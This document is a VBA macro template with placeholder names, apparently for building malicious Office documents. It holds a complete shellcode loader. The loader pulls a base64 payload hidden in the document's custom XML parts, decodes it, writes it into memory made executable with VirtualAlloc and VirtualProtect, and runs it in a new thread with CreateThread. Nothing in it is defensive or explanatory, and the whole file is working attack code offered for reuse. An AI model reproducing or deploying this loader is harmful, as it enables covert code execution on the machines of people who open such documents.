# Author: tdinh cute
# Decoded & Cleaned by: tdinh

' Author: tdinh
' Decoded by: tdinh cute

#If Win64 Then
    Declare PtrSafe Function VirtualAlloc Lib "kernel32" _
        (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
         ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

    Declare PtrSafe Function VirtualProtect Lib "kernel32" _
        (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
         ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long

    Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" _
        (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
    
Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, _
    ByVal dwMilliseconds As Long) As Long
#Else
  
    Declare Function VirtualAlloc Lib "kernel32" _
        (ByVal lpAddress As Long, ByVal dwSize As Long, _
         ByVal flAllocationType As Long, ByVal flProtect As Long) As Long

    Declare Function VirtualProtect Lib "kernel32" _
        (ByVal lpAddress As Long, ByVal dwSize As Long, _
         ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long

    Declare Sub RtlMoveMemory Lib "kernel32" _
        (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)
        
Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As Long, _
    ByVal lpParameter As Long, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As Long) As Long

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As Long, _
    ByVal dwMilliseconds As Long) As Long
#End If

Public Const MEM_COMMIT As Long = &H1000
Public Const MEM_RESERVE As Long = &H2000
Public Const PAGE_READWRITE As Long = &H4
Public Const PAGE_EXECUTE_READ As Long = &H20
Public Const PAGE_EXECUTE_READWRITE As Long = &H40


Sub %fn%()

 Dim part As CustomXMLPart
    For Each part In %slf%.CustomXMLParts
      If InStr(part.XML, "<%vn%>") > 0 Then
        Dim b64 As String
        b64 = part.XML
        b64 = Mid(b64, InStr(b64, ">") + 1)
        b64 = Left(b64, InStr(b64, "<") - 1)
        Dim objXML As Object
        Dim objNode As Object
        Dim Data() As Byte
        
        Set objXML = CreateObject("MSXML2.DOMDocument")
        Set objNode = objXML.createElement("b64")
    
        objNode.DataType = "bin.base64"
        objNode.Text = b64
        
        Data = objNode.nodeTypedValue
        
        Dim size As LongPtr
        size = UBound(Data) + 1

        Dim addr As LongPtr
        addr = VirtualAlloc(0, size, MEM_COMMIT Or MEM_RESERVE, PAGE_READWRITE)

        If addr = 0 Then
        Debug.Print "VirtualAlloc failed"
        Exit Sub
        End If
   
       
        RtlMoveMemory addr, Data(0), size
        
        Dim oldProtect As Long
        
        VirtualProtect addr, size, PAGE_EXECUTE_READ, oldProtect
    
        Dim threadId As Long
        Dim hThread As LongPtr
        hThread = CreateThread(0, 0, addr, 0, 0, threadId)

        If hThread = 0 Then
          MsgBox "CreateThread failed"
          Exit Sub
        End If
        
        Exit For
       End If
    Next
End Sub